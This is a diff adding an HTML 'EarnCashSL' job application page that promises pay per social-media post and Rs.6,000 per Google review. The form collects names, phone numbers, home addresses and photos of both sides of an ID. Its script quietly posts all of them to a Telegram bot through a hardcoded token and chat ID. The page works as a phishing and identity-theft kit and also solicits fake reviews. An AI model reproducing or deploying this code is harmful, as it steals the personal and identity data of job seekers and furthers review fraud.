@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EarnCashSL Application</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    h2 {
+      text-align: center;
+      color: #0072ff;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .add-btn, .submit-btn {
+      margin-top: 10px;
+      background: #0072ff;
+      color: #fff;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .submit-btn {
+      width: 100%;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+    .submit-btn:hover {
+      background: #005bb5;
+    }
+    .platforms label {
+      font-weight: normal;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>EarnCashSL Application Form</h2>
+    <form id="earnCashForm">
+      <label>Full Name</label>
+      <input type="text" name="fullname" required>
+
+      <label>Email Address</label>
+      <input type="email" name="email" required>
+
+      <label>Phone No.</label>
+      <input type="tel" name="phone" required>
+
+      <label>Social Media Links</label>
+      <div id="socialLinks">
+        <input type="url" name="social[]" placeholder="Enter social media link">
+      </div>
+      <button type="button" class="add-btn" onclick="addSocialLink()">+ Add More</button>
+
+      <label>Country</label>
+      <input type="text" name="country" required>
+
+      <label>Home Address</label>
+      <textarea name="address" rows="3" required></textarea>
+
+      <label>ID Front Page (attachment)</label>
+      <input type="file" name="id_front" accept="image/*,.pdf" required>
+
+      <label>ID Back Page (attachment)</label>
+      <input type="file" name="id_back" accept="image/*,.pdf" required>
+
+      <label>Referral ID</label>
+      <input type="text" name="referral">
+
+      <label>Which Platform would you like to Earn money?</label>
+      <div class="platforms">
+        <label><input type="checkbox" name="platforms[]" value="TikTok"> TikTok (per creation Rs.1,000/-)</label><br>
+        <label><input type="checkbox" name="platforms[]" value="Facebook"> Facebook (per creation Rs.750/-)</label><br>
+        <label><input type="checkbox" name="platforms[]" value="YouTube"> YouTube (per creation Rs.1,800/-)</label><br>
+        <label><input type="checkbox" name="platforms[]" value="DigitalApp"> Digital App review & App testing (Per Google Review Rs.6,000/-)</label>
+      </div>
+
+      <label>
+        <input type="checkbox" name="terms" required>
+        I agree to the <a href="terms.html" target="_blank">Terms & Conditions</a>
+      </label>
+
+      <button type="submit" class="submit-btn">Submit Application</button>
+    </form>
+  </div>
+
+  <script>
+    function addSocialLink() {
+      const div = document.createElement('div');
+      div.innerHTML = '<input type="url" name="social[]" placeholder="Enter social media link">';
+      document.getElementById('socialLinks').appendChild(div);
+    }
+
+    document.getElementById('earnCashForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      let message = "📋 New EarnCashSL Application:\n";
+      message += "Full Name: " + formData.get("fullname") + "\n";
+      message += "Email: " + formData.get("email") + "\n";
+      message += "Phone: " + formData.get("phone") + "\n";
+      message += "Country: " + formData.get("country") + "\n";
+      message += "Address: " + formData.get("address") + "\n";
+      message += "Referral ID: " + formData.get("referral") + "\n";
+
+      // Social links
+      const socials = formData.getAll("social[]");
+      if (socials.length > 0) {
+        message += "Social Media Links:\n";
+        socials.forEach(link => { if(link) message += " - " + link + "\n"; });
+      }
+
+      // Platforms
+      const platforms = formData.getAll("platforms[]");
+      if (platforms.length > 0) {
+        message += "Preferred Platforms:\n";
+        platforms.forEach(p => { message += " - " + p + "\n"; });
+      }
+
+      // Telegram Bot details
+      const botToken = "8196604700:AAFn9r3n0ocFl9pHJPf6NUuncS8SXxACH5w";
+      const chatId = "5048384244";
+
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+
+      // Send files (ID front/back)
+      const idFront = formData.get("id_front");
+      const idBack = formData.get("id_back");
+
+      async function sendFile(file, caption) {
+        if (!file || file.size === 0) return;
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("document", file, file.name);
+        fd.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+          method: "POST",
+          body: fd
+        });
+      }
+
+      await sendFile(idFront, "ID Front Page");
+      await sendFile(idBack, "ID Back Page");
+
+      alert("Application submitted successfully!");
+      this.reset();
+    });
+  </script>
+</body>
+</html>
